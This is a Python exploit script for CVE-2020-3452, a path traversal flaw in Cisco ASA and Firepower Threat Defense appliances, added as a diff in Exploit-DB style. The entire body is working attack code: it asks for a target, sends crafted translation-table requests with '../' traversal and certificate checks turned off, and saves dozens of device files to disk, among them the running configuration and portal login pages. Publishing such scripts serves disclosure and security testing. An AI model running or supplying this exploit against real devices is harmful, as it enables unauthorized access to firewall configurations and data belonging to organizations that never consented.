@@ -1,0 +1,113 @@
+# Exploit Title: Cisco ASA 9.14.1.10 and FTD 6.6.0.1 - Path Traversal (2)
+# Date: 12 Dec 2020
+# Exploit Author: Freakyclown@cygenta.co.uk
+# Vendor Homepage: cisco.com
+# Software Link: It’s against Hardware, specifically ASA’s and FTD’s
+# Version: ASAs (from version 9.6 to 9.14.1.10) and FTD’s (versions 6.2.3 to 6.6.0.1)
+# Tested on: exploit runs on Python3 on OSX and on Kali Linux against cisco ASA 9.14
+# CVE : CVE-2020-3452
+# Github : https://github.com/cygenta/CVE-2020-3452
+
+import requests
+
+# Written by freakyclown for @CygentaHQ
+# Cisco ASA Path Traversal
+# CVE-2020-3452
+# Usage: CVE-2020-3452.py {target}"
+# Example: CVE-2020-3452.py 192.168.0.12"
+# Requires - Requests - pip3 install requests
+#
+# This tool takes advantage of the above cve and attempts to
+# download files as listed below, it is suggested that you make
+# a working folder for the outputfiles to avoid confusion if
+# attacking mutliple ASA's
+
+# set your target
+target = input("Enter target IP/Url: ")
+
+
+def grabstuff():
+    for file in files:
+        print("trying: ", file)
+
+        #set request parameters
+        params = (
+            ('type', 'mst'),
+            ('textdomain', '+CSCOE+/'+file),
+            ('default-language', ''),
+            ('lang', '../'),
+        )
+
+        # set the response to the result of the request, inputting in target and params and ignoring ssl cert problems
+        response = requests.get('https://'+target+'/+CSCOT+/translation-table', params=params, verify=False)
+        # write the file to the disk
+        f = open(file,"w")
+        f.write(response.text) 
+        f.close()
+
+
+
+# this is a list of files available to download, more will be added in time
+# if anyone has a list of ASA files, I'd be happy to add here
+files = {
+"sess_update.html",
+"blank.html",
+"noportal.html",
+"portal_ce.html",
+"portal.html",
+"logon_custom.css",
+"svc.html",
+"logo.gif",
+"portal_inc.lua",
+"nostcaccess.html",
+"session.js",
+"portal.js",
+"portal_custom.css",
+"running.conf",
+"tlbrportal_forms.js",
+"logon_forms.js",
+"win.js",
+"portal.css",
+"lced.html",
+"pluginlib.js",
+"useralert.html",
+"ping.html",
+"app_index.html",
+"shshimdo_url",
+"session_password.html",
+"relayjar.html",
+"relayocx.html",
+"color_picker.js",
+"color_picker.html",
+"cedhelp.html",
+"cedmain.html",
+"cedlogon.html",
+"cedportal.html",
+"portal_elements.html",
+"commonspawn.js",
+"common.js",
+"appstart.js",
+"relaymonjar.html",
+"relaymonocx.html",
+"cedsave.html",
+"tunnel_linux.jnlp",
+"ask.html",
+"no_svc.html",
+"preview.html",
+"cedf.html",
+"ced.html",
+"logon_redirect.html",
+"logout.html",
+"tunnel_mac.jnlp",
+"gp-gip.html",
+"auth.html",
+"wrong_url.html",
+"logon.html"}
+
+
+# obvious thing is obvious, try the things and barf if fail
+try:
+    grabstuff()
+except Exception as err:
+    print("Something went wrong sorry")
+    print(err)
